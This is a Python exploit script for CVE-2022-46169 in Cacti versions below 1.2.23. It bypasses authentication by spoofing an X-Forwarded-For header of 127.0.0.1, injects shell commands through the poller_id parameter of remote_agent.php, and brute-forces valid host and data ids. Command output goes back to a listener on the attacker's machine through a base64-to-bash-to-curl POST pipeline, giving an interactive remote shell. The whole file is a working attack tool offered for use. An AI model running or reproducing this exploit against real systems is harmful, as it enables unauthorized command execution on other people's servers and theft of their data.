#!/usr/bin/env python3
from requests import get, exceptions
from argparse import ArgumentParser
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, quote
from threading import Thread
from base64 import b64encode

class ReceiverBaseServer(BaseHTTPRequestHandler):

    def log_message(self, *args):
        return

    def do_GET(self):
        self.send_response(200)

        url = urlparse(self.path)
        parameters = parse_qs(url.query)
        hostID = parameters.get("hostid")
        localDataIds = parameters.get("localdataid")
        
        if hostID and localDataIds:
            self.server.hostid = hostID[0]
            self.server.localDataId = localDataIds[0]
    
    def do_POST(self):
        self.send_response(200)
        
        bodySize = int(self.headers.get('Content-Length'))
        bodyBytes = self.rfile.read(bodySize)

        try:
            body = str(bodyBytes, "utf-8")
            print(body)
        except UnicodeDecodeError:
            outputFilename = "latestCommandOutput"
            print(f"Received non-unicode data. Writing data to './{outputFilename}'")
            with open(outputFilename, "wb") as output:
                output.write(bodyBytes)

class ReceiverServer(HTTPServer):

    def __init__(self, lhost: str, lport: int, cactiUrl: str):
        HTTPServer.__init__(self, (lhost, lport), ReceiverBaseServer)        
        self.url = cactiUrl
        self.serverThread = None
        self.hostid = None
        self.localDataId = None

    def executeCommand(self, command: str, localDataId: int = None, hostId: int = None):
        localDataId = localDataId if localDataId != None else self.localDataId
        hostId = hostId if hostId != None else self.hostid

        authBypassHeaders = {"X-Forwarded-For": "127.0.0.1"}
        encodedCommand = quote(command)
        url = self.url + f"remote_agent.php?action=polldata&local_data_ids[]={localDataId}&host_id={hostId}&poller_id=`{encodedCommand}`"

        try:
            get(url, headers=authBypassHeaders, timeout=10)
        except exceptions.ReadTimeout:
            print("Command execution timed out")
        except exceptions.ConnectionError:
            print("Could not connect to the given url")

    def executeCommandAndGetResponse(self, command: str):
        b64command = str(b64encode(command.encode()), "utf-8")
        lhost, lport = self.server_address
        finalCommand = f"echo {b64command} | base64 -d | bash | curl -X POST 'http://{lhost}:{lport}' --data-binary '@-'"
        self.executeCommand(finalCommand)

    def getWorkingIds(self, idsRange: list = range(10)): 
        print("Looking for valid ids..")
        lhost, lport = self.server_address
        for hostId in idsRange:
            for localDataId in idsRange:
                command = f"curl 'http://{lhost}:{lport}/?hostid={hostId}&localdataid={localDataId}'"
                self.executeCommand(command, localDataId, hostId)
                if self.hostid and self.localDataId:
                    print("Valid ids found!")
                    return
        print("Did not find any valid ids")

    def start(self):
        self.serverThread = Thread(target=self.serve_forever, daemon=True)
        self.serverThread.start()

    def stop(self):
        self.shutdown()
        self.serverThread.join()

def getArguments():
    parser = ArgumentParser(description="Exploit for CVE-2022-46169: Authentication bypass & Command injection in Cacti <1.2.23")
    parser.add_argument("-u", "--url", required=True, help="URL to Cacti installation (e.g: http://mysite.com/cacti/)")
    parser.add_argument("-l", "--lhost", required=True, help="Listening host")
    parser.add_argument("-p", "--port", required=False, default=4444, help="Listening port (Default: 4444)")
    parser.add_argument("-c", "--command", required=False, help="Command to execute")
    return parser.parse_args()

def formatUrl(url: str) -> str:
    if not url.startswith("http"):
        url = f"http://{url}"
    if not url.endswith('/'):
        url += '/'
    return url

def enterInteractiveShell(receiver: ReceiverServer):
    print("Press Ctrl+C to exit")
    while True:
        command = input("\n$ ")
        receiver.executeCommandAndGetResponse(command)

def main():
    args = getArguments()
    url = formatUrl(args.url)

    receiver = ReceiverServer(args.lhost, args.port, url)
    receiver.start()
    receiver.getWorkingIds()

    if not receiver.hostid and receiver.localDataId:
        print("Did not find a valid HostId and LocalDataId")
        exit(1)

    if args.command:
        receiver.executeCommandAndGetResponse(args.command)
    else:
        try:
            enterInteractiveShell(receiver)
        except KeyboardInterrupt:
            print("\nQuitting..")

if __name__ == "__main__":
    main()
